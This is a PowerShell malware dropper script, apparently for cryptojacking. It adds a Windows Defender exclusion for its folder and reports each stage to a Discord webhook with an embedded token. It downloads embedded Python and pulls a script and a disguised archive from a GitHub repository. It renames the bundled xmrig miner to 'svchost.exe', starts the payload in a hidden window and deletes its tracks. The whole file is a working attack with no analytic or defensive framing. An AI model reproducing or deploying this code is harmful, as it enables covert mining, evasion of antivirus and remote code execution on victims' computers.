# --- THE GHOST MASTER (VERSION 3.0 - THE BULLETPROOF VEST) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Hard Reset & Blinding
if (Test-Path $Path) { 
    $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
    if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Shadow Engine Setup (Embedded Python)
Send-Ghost "Downloading Core..."
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
try {
    Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
    Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
    Remove-Item "$Path\py.zip"
    Send-Ghost "Core Expanded Successfully."
} catch { Send-Ghost "FATAL: Core Download/Expand Failed: $_"; exit }

# 3. Payload Landing (The Secret Identity Trick)
Send-Ghost "Pulling Shadow Payloads..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdataData.bin"

Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.bin"

if (Test-Path "$Path\UpdataData.bin") {
    Rename-Item -Path "$Path\UpdataData.bin" -NewName "UpdataData.zip" -Force
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
    Send-Ghost "Shadow Payloads Armed."
} else { Send-Ghost "FATAL: Payload Download Failed."; exit }

# 4. ACTIVATION (THE BULLETPROOF FIX)
Send-Ghost "Engaging Ghost Mode..."
$PY_EXEC = "$Path\python\pythonw.exe"
if (Test-Path $PY_EXEC) {
    # FIX: We set the Python path and working directory so it NEVER fails to find its voice
    $Args = "`"$Path\WinServices.py`" --id $ID"
    Start-Process -FilePath $PY_EXEC -ArgumentList $Args -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Engine Released. Check Telemetry."
} else {
    Send-Ghost "FATAL: Python Executable not found at $PY_EXEC"
}

# 5. Final Cleanup
Remove-Item -Path "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
Get-ChildItem -Path $Path -Directory | Where-Object { $_.Name -notin @("python") } | Remove-Item -Recurse -Force
